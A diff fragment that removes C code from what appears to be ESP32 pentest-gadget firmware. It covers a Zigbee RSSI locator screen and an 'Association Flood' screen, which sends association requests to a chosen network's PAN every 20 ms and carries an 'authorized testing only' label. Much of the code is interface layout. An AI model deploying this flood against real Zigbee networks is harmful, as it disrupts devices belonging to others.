-    lv_obj_set_style_bg_color(back, ui_card_pressed_color(), LV_STATE_PRESSED);
-    lv_obj_set_style_border_color(back, ui_border_color(), 0);
-    lv_obj_set_style_border_width(back, 1, 0);
-    lv_obj_set_style_radius(back, 6, 0);
-    lv_obj_t *blbl = lv_label_create(back);
-    lv_label_set_text(blbl, LV_SYMBOL_LEFT "  Back");
-    lv_obj_set_style_text_font(blbl, &lv_font_montserrat_12, 0);
-    lv_obj_set_style_text_color(blbl, ui_text_color(), 0);
-    lv_obj_center(blbl);
-    lv_obj_add_event_cb(back, s_zgwd_detail_back_cb, LV_EVENT_CLICKED, NULL);
-
-    lv_timer_create(s_zgwd_da_poll_timer_cb, 300, NULL);
-}
-
-// ── RSSI Locator screen ───────────────────────────────────────────────────────
-// Locator task: stop WiFi → enable 802.15.4 → park on channel → receive loop
-// When cancelled: sleep → disable → restart WiFi → task=NULL
-static void s_zgwd_loc_task_fn(void *arg)
-{
-    zgwd_loc_ctx_t *loc = (zgwd_loc_ctx_t *)arg;
-
-    if (current_radio_mode == RADIO_MODE_WIFI) {
-        esp_wifi_set_promiscuous(false);
-        esp_wifi_stop(); esp_wifi_deinit();
-        wifi_initialized = false;
-        current_radio_mode = RADIO_MODE_NONE;
-    }
-
-    if (!s_zgwd_rx_q)
-        s_zgwd_rx_q = xQueueCreate(ZGWD_Q_DEPTH, sizeof(zgwd_frame_msg_t));
-
-    if (g_led_strip) { led_strip_clear(g_led_strip); vTaskDelay(pdMS_TO_TICKS(100)); }
-
-    if (esp_ieee802154_enable() != ESP_OK) {
-        ESP_LOGE(TAG, "[LOC] 802.15.4 enable failed");
-        goto loc_done;
-    }
-    esp_ieee802154_set_promiscuous(true);
-    esp_ieee802154_set_panid(0xFFFF);
-    esp_ieee802154_set_short_address(0xFFFE);
-    esp_ieee802154_set_channel(loc->channel);
-    esp_ieee802154_receive();
-
-    while (loc->running) {
-        zgwd_frame_msg_t msg;
-        if (xQueueReceive(s_zgwd_rx_q, &msg, pdMS_TO_TICKS(100)) == pdTRUE) {
-            loc->last_rssi = msg.rssi;
-            loc->got_rssi  = true;
-        }
-    }
-
-    esp_ieee802154_sleep();
-    esp_ieee802154_disable();
-
-loc_done:
-    ensure_wifi_mode();
-    apply_wifi_power_settings();
-    loc->task = NULL;
-    vTaskDelete(NULL);
-}
-
-static void s_zgwd_loc_timer_cb(lv_timer_t *t)
-{
-    (void)t;
-    zgwd_loc_ctx_t *loc = s_zgwd_loc;
-    if (!loc) return;
-
-    if (loc->rssi_lbl) {
-        char buf[32];
-        if (loc->got_rssi)
-            snprintf(buf, sizeof(buf), "RSSI: %d dBm", (int)loc->last_rssi);
-        else
-            snprintf(buf, sizeof(buf), "Waiting for signal...");
-        lv_label_set_text(loc->rssi_lbl, buf);
-    }
-
-    if (loc->got_rssi) {
-        if (loc->rssi_bar) {
-            int pct = (int)(loc->last_rssi + 90) * 100 / 50;
-            if (pct < 0) pct = 0;
-            if (pct > 100) pct = 100;
-            lv_bar_set_value(loc->rssi_bar, pct, LV_ANIM_ON);
-        }
-        if (loc->last_rssi > -75) {
-            int vpct = 10 + (loc->last_rssi + 75) * 90 / 35;
-            if (vpct < 10) vpct = 10;
-            if (vpct > 100) vpct = 100;
-            g_vibtest_strength_pct = vpct;
-            vibrator_pulse(80);
-        }
-    }
-}
-
-static void s_zgwd_loc_back_cb(lv_event_t *e)
-{
-    (void)e;
-    vibrator_off();
-    g_vibtest_strength_pct = 100;
-    if (s_zgwd_loc) {
-        s_zgwd_loc->running = false;
-        if (s_zgwd_loc->tmr) { lv_timer_del(s_zgwd_loc->tmr); s_zgwd_loc->tmr = NULL; }
-        s_zgwd_loc->rssi_bar = NULL; s_zgwd_loc->rssi_lbl = NULL; s_zgwd_loc->pan_lbl = NULL;
-        // Don't free yet — task still calls disable/wifi-restart then sets task=NULL
-        // reset_function_page_children (via show_zigbee_wardrive_screen) will free it
-    }
-    show_zigbee_wardrive_screen();
-}
-
-static void zgwd_locator_stop(void)
-{
-    vibrator_off();
-    g_vibtest_strength_pct = 100;
-    if (s_zgwd_loc) {
-        s_zgwd_loc->running = false;
-        if (s_zgwd_loc->tmr) { lv_timer_del(s_zgwd_loc->tmr); s_zgwd_loc->tmr = NULL; }
-        s_zgwd_loc->rssi_bar = NULL; s_zgwd_loc->rssi_lbl = NULL; s_zgwd_loc->pan_lbl = NULL;
-    }
-}
-
-static void show_zgwd_locator(int pan_idx)
-{
-    (void)pan_idx;
-    zgwd_pan_entry_t *pe = &s_zgwd_sel_pan;
-
-    zgwd_loc_ctx_t *loc = heap_caps_calloc(1, sizeof(zgwd_loc_ctx_t), MALLOC_CAP_SPIRAM);
-    if (!loc) return;
-    loc->channel = pe->channel;
-    loc->running = true;
-
-    create_function_page_base("ZB Locator");
-    g_screen_stop_fn = zgwd_locator_stop;
-    s_zgwd_loc = loc;
-    apply_menu_bg();
-
-    char buf[40];
-    snprintf(buf, sizeof(buf), "PAN 0x%04X  Ch %u", pe->pan_id, pe->channel);
-    loc->pan_lbl = lv_label_create(function_page);
-    lv_label_set_text(loc->pan_lbl, buf);
-    lv_obj_set_style_text_font(loc->pan_lbl, &lv_font_montserrat_14, 0);
-    lv_obj_set_style_text_color(loc->pan_lbl, lv_color_hex(0x4DB6AC), 0);
-    lv_obj_align(loc->pan_lbl, LV_ALIGN_TOP_MID, 0, 35);
-
-    loc->rssi_bar = lv_bar_create(function_page);
-    lv_obj_set_size(loc->rssi_bar, LCD_H_RES - 32, 24);
-    lv_obj_align(loc->rssi_bar, LV_ALIGN_CENTER, 0, -20);
-    lv_bar_set_range(loc->rssi_bar, 0, 100);
-    lv_bar_set_value(loc->rssi_bar, 0, LV_ANIM_OFF);
-    lv_obj_set_style_bg_color(loc->rssi_bar, lv_color_hex(0x1B5E20), LV_PART_INDICATOR);
-    lv_obj_set_style_bg_color(loc->rssi_bar, lv_color_hex(0x333333), 0);
-    lv_obj_set_style_radius(loc->rssi_bar, 4, 0);
-
-    loc->rssi_lbl = lv_label_create(function_page);
-    lv_label_set_text(loc->rssi_lbl, "Starting up...");
-    lv_obj_set_style_text_font(loc->rssi_lbl, &lv_font_montserrat_14, 0);
-    lv_obj_set_style_text_color(loc->rssi_lbl, lv_color_hex(0xFFFFFF), 0);
-    lv_obj_align(loc->rssi_lbl, LV_ALIGN_CENTER, 0, 20);
-
-    lv_obj_t *hint = lv_label_create(function_page);
-    lv_label_set_text(hint, "Move closer to increase signal.\nVibration strengthens near source.");
-    lv_obj_set_style_text_font(hint, &lv_font_montserrat_12, 0);
-    lv_obj_set_style_text_color(hint, lv_color_make(140, 140, 140), 0);
-    lv_obj_align(hint, LV_ALIGN_CENTER, 0, 55);
-    lv_label_set_long_mode(hint, LV_LABEL_LONG_WRAP);
-    lv_obj_set_width(hint, LCD_H_RES - 20);
-
-    lv_obj_t *back = lv_btn_create(function_page);
-    lv_obj_set_size(back, LCD_H_RES - 16, 30);
-    lv_obj_align(back, LV_ALIGN_BOTTOM_MID, 0, -4);
-    lv_obj_set_style_bg_color(back, ui_panel_color(), LV_STATE_DEFAULT);
-    lv_obj_set_style_border_color(back, ui_border_color(), 0);
-    lv_obj_set_style_border_width(back, 1, 0);
-    lv_obj_set_style_radius(back, 6, 0);
-    lv_obj_t *blbl = lv_label_create(back);
-    lv_label_set_text(blbl, LV_SYMBOL_LEFT "  Stop & Back");
-    lv_obj_set_style_text_font(blbl, &lv_font_montserrat_12, 0);
-    lv_obj_set_style_text_color(blbl, ui_text_color(), 0);
-    lv_obj_center(blbl);
-    lv_obj_add_event_cb(back, s_zgwd_loc_back_cb, LV_EVENT_CLICKED, NULL);
-
-    loc->tmr = lv_timer_create(s_zgwd_loc_timer_cb, 500, NULL);
-    // Radio enable happens in task (needs WiFi stop first — can't block LVGL task)
-    xTaskCreate(s_zgwd_loc_task_fn, "zgwd_loc", 3072, loc, 2, &loc->task);
-}
-
-// ── Association Flood screen ──────────────────────────────────────────────────
-static void s_zgwd_flood_task_fn(void *arg)
-{
-    zgwd_flood_ctx_t *fld = (zgwd_flood_ctx_t *)arg;
-    if (!s_zgwd_tx_sem) s_zgwd_tx_sem = xSemaphoreCreateBinary();
-
-    esp_ieee802154_enable();
-    esp_ieee802154_set_promiscuous(false);
-    esp_ieee802154_set_coordinator(false);
-    esp_ieee802154_set_panid(fld->pan_id);
-    esp_ieee802154_set_short_address(0xFFFE);
-    esp_ieee802154_set_channel(fld->channel);
-    esp_ieee802154_receive();
-
-    while (!fld->cancel) {
-        s_zgwd_send_assoc_req(fld->pan_id);
-        fld->sent++;
-        vTaskDelay(pdMS_TO_TICKS(20));
-    }
-
-    esp_ieee802154_sleep();
-    esp_ieee802154_disable();
-    ensure_wifi_mode();
-    fld->task = NULL;
-    vTaskDelete(NULL);
-}
-
-static void s_zgwd_flood_ui_timer_cb(lv_timer_t *t)
-{
-    (void)t;
-    zgwd_flood_ctx_t *fld = s_zgwd_fld;
-    if (!fld) return;
-    if (fld->count_lbl) {
-        char buf[48];
-        snprintf(buf, sizeof(buf), "Requests sent: %d", fld->sent);
-        lv_label_set_text(fld->count_lbl, buf);
-    }
-    if (!fld->task && fld->stop_btn) {
-        lv_obj_t *l = lv_obj_get_child(fld->stop_btn, 0);
-        if (l) lv_label_set_text(l, LV_SYMBOL_OK "  Done");
-        lv_obj_add_state(fld->stop_btn, LV_STATE_DISABLED);
-    }
-}
-
-static void s_zgwd_flood_stop_cb(lv_event_t *e)
-{
-    (void)e;
-    zgwd_flood_ctx_t *fld = s_zgwd_fld;
-    if (fld) fld->cancel = true;
-}
-
-static void s_zgwd_flood_back_cb(lv_event_t *e)
-{
-    (void)e;
-    if (s_zgwd_fld) {
-        s_zgwd_fld->cancel = true;
-        if (s_zgwd_fld->tmr) { lv_timer_del(s_zgwd_fld->tmr); s_zgwd_fld->tmr = NULL; }
-        if (!s_zgwd_fld->task) { heap_caps_free(s_zgwd_fld); s_zgwd_fld = NULL; }
-    }
-    show_main_tiles();
-}
-
-static void zgwd_flood_stop(void)
-{
-    if (s_zgwd_fld) {
-        s_zgwd_fld->cancel = true;
-        if (s_zgwd_fld->tmr) { lv_timer_del(s_zgwd_fld->tmr); s_zgwd_fld->tmr = NULL; }
-        if (!s_zgwd_fld->task) { heap_caps_free(s_zgwd_fld); s_zgwd_fld = NULL; }
-    }
-}
-
-static void show_zgwd_flood(int pan_idx)
-{
-    (void)pan_idx;
-    zgwd_pan_entry_t *pe = &s_zgwd_sel_pan;
-
-    zgwd_flood_ctx_t *fld = heap_caps_calloc(1, sizeof(zgwd_flood_ctx_t), MALLOC_CAP_SPIRAM);
-    if (!fld) return;
-    fld->pan_id  = pe->pan_id;
-    fld->channel = pe->channel;
-
-    create_function_page_base("Assoc Flood");
-    g_screen_stop_fn = zgwd_flood_stop;
-    s_zgwd_fld = fld;
-    apply_menu_bg();
-
-    // Warning label
-    lv_obj_t *warn = lv_label_create(function_page);
-    lv_label_set_text(warn, "! FOR AUTHORIZED TESTING ONLY");
-    lv_obj_set_style_text_font(warn, &lv_font_montserrat_12, 0);
-    lv_obj_set_style_text_color(warn, lv_color_hex(0xEF5350), 0);
-    lv_obj_align(warn, LV_ALIGN_TOP_MID, 0, 34);
-
-    char buf[48];
-    snprintf(buf, sizeof(buf), "Target: PAN 0x%04X  Ch %u", pe->pan_id, pe->channel);
-    lv_obj_t *tgt = lv_label_create(function_page);
-    lv_label_set_text(tgt, buf);
-    lv_obj_set_style_text_font(tgt, &lv_font_montserrat_12, 0);
-    lv_obj_set_style_text_color(tgt, lv_color_hex(0x4DB6AC), 0);
-    lv_obj_align(tgt, LV_ALIGN_TOP_MID, 0, 54);
-
-    fld->count_lbl = lv_label_create(function_page);
-    lv_label_set_text(fld->count_lbl, "Requests sent: 0");
-    lv_obj_set_style_text_font(fld->count_lbl, &lv_font_montserrat_14, 0);
-    lv_obj_set_style_text_color(fld->count_lbl, lv_color_hex(0xFFFFFF), 0);
-    lv_obj_align(fld->count_lbl, LV_ALIGN_CENTER, 0, 0);
-
-    fld->stop_btn = s_zgwd_make_btn(function_page, LV_SYMBOL_STOP "  Stop Flood",
-        lv_color_hex(0xB71C1C), LV_ALIGN_BOTTOM_MID, 0, -38, 160, 32);
-    lv_obj_add_event_cb(fld->stop_btn, s_zgwd_flood_stop_cb, LV_EVENT_CLICKED, NULL);
-
-    lv_obj_t *back = lv_btn_create(function_page);
-    lv_obj_set_size(back, LCD_H_RES - 16, 30);
-    lv_obj_align(back, LV_ALIGN_BOTTOM_MID, 0, -4);
-    lv_obj_set_style_bg_color(back, ui_panel_color(), LV_STATE_DEFAULT);
-    lv_obj_set_style_border_color(back, ui_border_color(), 0);
-    lv_obj_set_style_border_width(back, 1, 0);
-    lv_obj_set_style_radius(back, 6, 0);
-    lv_obj_t *blbl = lv_label_create(back);
-    lv_label_set_text(blbl, LV_SYMBOL_LEFT "  Stop & Back");
-    lv_obj_set_style_text_font(blbl, &lv_font_montserrat_12, 0);
-    lv_obj_set_style_text_color(blbl, ui_text_color(), 0);
-    lv_obj_center(blbl);
-    lv_obj_add_event_cb(back, s_zgwd_flood_back_cb, LV_EVENT_CLICKED, NULL);
-
-    fld->tmr = lv_timer_create(s_zgwd_flood_ui_timer_cb, 300, NULL);
-    xTaskCreate(s_zgwd_flood_task_fn, "zgwdfld", 3072, fld, 2, &fld->task);
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
